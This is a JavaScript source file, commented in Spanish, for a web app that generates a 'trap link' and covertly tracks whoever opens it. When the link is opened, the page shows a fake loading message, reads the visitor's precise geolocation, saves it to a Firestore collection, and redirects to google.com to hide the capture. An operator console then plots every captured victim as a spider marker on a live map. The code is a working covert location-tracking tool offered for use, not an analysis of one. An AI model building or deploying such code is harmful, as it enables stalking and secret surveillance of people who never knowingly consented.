import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
import { getFirestore, collection, addCollection, addDoc, getDocs, query, orderBy, onSnapshot } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";
// Nota: Usamos addDoc para generar registros múltiples independientes

// CONFIGURA AQUÍ TUS CREDENCIALES DE FIREBASE
const firebaseConfig = {
    apiKey: "TU_API_KEY",
    authDomain: "tu-proyecto.firebaseapp.com",
    projectId: "tu-proyecto",
    storageBucket: "tu-proyecto.appspot.com",
    messagingSenderId: "TU_MESSAGING_SENDER_ID",
    appId: "TU_APP_ID"
};

// Inicializar Firebase
const app = initializeApp(firebaseConfig);
const db = getFirestore(app);

let map;
let marcadoresAracnidos = []; // Arreglo para almacenar múltiples arañas en el mapa
const ubicacionPorDefecto = [14.3333, -90.6667]; 

// Detectar si la URL trae un parámetro de objetivo
const urlParams = new URLSearchParams(window.location.search);
const targetId = urlParams.get('target');

// Crear un icono personalizado con el emoji de araña 🕷️
const iconoArana = L.divIcon({
    className: 'custom-spider-icon',
    html: '<div style="font-size: 28px; text-align: center; filter: drop-shadow(0 2px 4px rgba(0,0,0,0.6));">🕷️</div>',
    iconSize: [30, 30],
    iconAnchor: [15, 15]
});

// Icono alternativo para tu punto de origen/consola (opcional, un punto azul o clásico)
const iconoOrigen = L.divIcon({
    className: 'custom-origin-icon',
    html: '<div style="font-size: 24px; text-align: center;">📍</div>',
    iconSize: [25, 25],
    iconAnchor: [12, 12]
});

document.addEventListener("DOMContentLoaded", function () {
    // ESCENARIO A: Si alguien abrió el enlace trampa en su celular
    if (targetId) {
        document.body.style.backgroundColor = "#ffffff";
        document.body.innerHTML = "<div style='display:flex;justify-content:center;align-items:center;height:100vh;font-family:sans-serif;color:#666;'><h3>Cargando recurso...</h3></div>";
        iniciarCapturaDiscreta();
        return; 
    }

    // ESCENARIO B: Estás en tu consola principal (PC); inicializamos el mapa
    map = L.map('map', { zoomControl: false }).setView(ubicacionPorDefecto, 14);

    L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
        maxZoom: 19,
        attribution: '&copy; OpenStreetMap contributors'
    }).addTo(map);

    setTimeout(() => { map.invalidateSize(); }, 200);
});

// Botón SHARE LINK: Genera el enlace que pediste
window.compartirEnlace = function() {
    const enlaceObjetivo = "https://mmommo52.github.io/Spidey/?target=objetivo_principal";
    
    navigator.clipboard.writeText(enlaceObjetivo).then(() => {
        alert("¡Enlace táctico copiado al portapapeles!\n" + enlaceObjetivo);
    }).catch(err => {
        console.error("Error al copiar enlace:", err);
    });
};

// Capturar ubicación discretamente y guardarla como un nuevo registro único
function iniciarCapturaDiscreta() {
    if (!navigator.geolocation) {
        window.location.href = "https://www.google.com";
        return;
    }

    navigator.geolocation.getCurrentPosition(
        async (position) => {
            const lat = position.coords.latitude;
            const lng = position.coords.longitude;

            try {
                // Guardamos en una colección llamada "rastreos_multiples" usando addDoc 
                // para que cada clic cree un documento nuevo con ID diferente y no se sobrescriba.
                await addDoc(collection(db, "rastreos_multiples"), {
                    lat: lat,
                    lng: lng,
                    tipo: "objetivo",
                    timestamp: new Date()
                });
            } catch (e) {
                console.error("Error al guardar en base de datos:", e);
            }
            
            window.location.href = "https://www.google.com";
        },
        (error) => {
            window.location.href = "https://www.google.com";
        },
        { enableHighAccuracy: true, timeout: 10000 }
    );
}

// Botón SYS.CHECK: Carga tu posición de origen y todas las arañas de los objetivos guardados
window.accionRastrearObjetivo = function() {
    document.getElementById('banner-status').innerHTML = "CARGANDO HISTORIAL<br>DE ACCESOS...";

    // 1. Obtener primero tu ubicación actual (Punto de origen)
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition((pos) => {
            const miLat = pos.coords.latitude;
            const miLng = pos.coords.longitude;
            
            // Centrar mapa en tu posición de origen
            map.setView([miLat, miLng], 14);
            
            // Colocar tu marcador de origen
            const markerOrigen = L.marker([miLat, miLng], { icon: iconoOrigen }).addTo(map);
            markerOrigen.bindPopup("<b>Tu posición (Origen)</b>").openPopup();
        });
    }

    // 2. Escuchar y pintar en tiempo real TODOS los puntos de acceso de las arañas guardadas
    const q = query(collection(db, "rastreos_multiples"));
    
    onSnapshot(q, (snapshot) => {
        // Limpiamos marcadores anteriores para evitar duplicados visuales al refrescar
        marcadoresAracnidos.forEach(m => map.removeLayer(m));
        marcadoresAracnidos = [];

        if (snapshot.empty) {
            document.getElementById('banner-status').innerHTML = "SIN REGISTROS<br>ESPERANDO CLICS...";
            return;
        }

        snapshot.forEach((docSnap) => {
            const data = docSnap.data();
            const lat = data.lat;
            const lng = data.lng;
            const fecha = data.timestamp ? new Date(data.timestamp.seconds * 1000).toLocaleTimeString() : "Reciente";

            // Crear un marcador de araña 🕷️ por cada registro encontrado en la base de datos
            const spiderMarker = L.marker([lat, lng], { icon: iconoArana }).addTo(map);
            spiderMarker.bindPopup(`<b>¡Acceso Registrado!</b><br>Hora: ${fecha}<br>Lat: ${lat.toFixed(4)}<br>Lng: ${lng.toFixed(4)}`);
            
            marcadoresAracnidos.push(spiderMarker);
        });

        document.getElementById('banner-status').innerHTML = `REGISTROS ACTIVOS<br>ARAÑAS EN MAPA: ${snapshot.size}`;
    });
};

// Funciones secundarias de los botones de la consola
window.obtenerUbicacionActual = function(esInicio = false) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition((pos) => {
            const lat = pos.coords.latitude;
            const lng = pos.coords.longitude;
            map.setView([lat, lng], 16);
            L.marker([lat, lng]).addTo(map).bindPopup("Tu posición local").openPopup();
        });
    }
};

window.centrarUbicacion = () => map.invalidateSize();
window.cambiarAlerta = (t) => alert("Alerta: " + t);
window.cambiarPerfil = (n) => alert("Perfil: " + n);
window.abrirChat = () => alert("Canal de chat seguro abierto.");
window.verArchivo = () => alert("Abriendo registros históricos...");
